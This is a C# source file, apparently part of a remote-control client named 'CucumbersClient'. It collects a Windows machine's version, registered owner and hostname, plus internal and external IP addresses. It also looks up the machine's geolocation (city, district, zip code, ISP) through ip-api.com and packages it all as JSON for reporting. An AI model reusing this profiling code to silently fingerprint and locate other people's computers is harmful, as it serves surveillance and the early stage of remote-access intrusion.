using Newtonsoft.Json.Linq;
using System;
using System.Net;
using System.Net.Sockets;

namespace CucumbersClient
{
    class Commands
    {
        public string getInitialInformation()
        {
            try
            {
                string windowsVersion = Microsoft.Win32.Registry.GetValue(@"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion", "ProductName", "").ToString();
                string windowsBuild = Microsoft.Win32.Registry.GetValue(@"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion", "CurrentBuild", "").ToString();
                string owner = Microsoft.Win32.Registry.GetValue(@"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion", "RegisteredOwner", "").ToString();
                string hostname = Microsoft.Win32.Registry.GetValue(@"HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\ComputerName\ComputerName", "ComputerName", "").ToString();

                string externalIP = "";
                string country = "";
                string state = "";
                string city = "";
                string district = "";
                string zip = "";
                string isp = "";
                string timezone = "";

                string IPInformationRaw = new WebClient().DownloadString("http://ip-api.com/json?fields=status,country,regionName,city,district,zip,timezone,isp,query");
                JObject IPInformationJSON = JObject.Parse(IPInformationRaw);

                if (IPInformationJSON.GetValue("status").ToString() == "success")
                {
                    externalIP = IPInformationJSON.GetValue("query").ToString();
                    country = IPInformationJSON.GetValue("country").ToString();
                    state = IPInformationJSON.GetValue("regionName").ToString();
                    city = IPInformationJSON.GetValue("city").ToString();
                    district = IPInformationJSON.GetValue("district").ToString();
                    zip = IPInformationJSON.GetValue("zip").ToString();
                    isp = IPInformationJSON.GetValue("isp").ToString();
                    timezone = IPInformationJSON.GetValue("timezone").ToString();
                }

                string internalIP = "";

                var IPs = Dns.GetHostEntry(Dns.GetHostName());
                foreach (var ip in IPs.AddressList)
                {
                    if (ip.AddressFamily == AddressFamily.InterNetwork)
                    {
                        internalIP = ip.ToString();
                    }
                }

                JObject finalJSON = new JObject();

                finalJSON.Add("windowsVersion", windowsVersion);
                finalJSON.Add("windowsBuild", windowsBuild);
                finalJSON.Add("owner", owner);
                finalJSON.Add("hostname", hostname);
                finalJSON.Add("externalIP", externalIP);
                finalJSON.Add("internalIP", internalIP);
                finalJSON.Add("city", city);
                finalJSON.Add("district", district);
                finalJSON.Add("state", state);
                finalJSON.Add("country", country);
                finalJSON.Add("zip", zip);
                finalJSON.Add("isp", isp);
                finalJSON.Add("timezone", timezone);

                foreach (var item in finalJSON)
                {
                    if (item.Value.ToString() == "")
                    {
                        finalJSON[item.Key] = "N/A";
                    }
                }
                return finalJSON.ToString().Replace(Environment.NewLine, "");
            }
            catch (Exception)
            {
                return "{ \"windowsVersion\": \"N/A\", \"windowsBuild\": \"N/A\", \"owner\": \"N/A\", \"hostname\": \"N/A\", \"externalIP\": \"N/A\", \"internalIP\": \"N/A\", \"city\": \"N/A\", \"district\": \"N/A\", \"state\": \"N/A\", \"country\": \"N/A\", \"zip\": \"N/A\", \"isp\": \"N/A\", \"timezone\": \"N/A\"}\n";
            }
        }
    }  
}
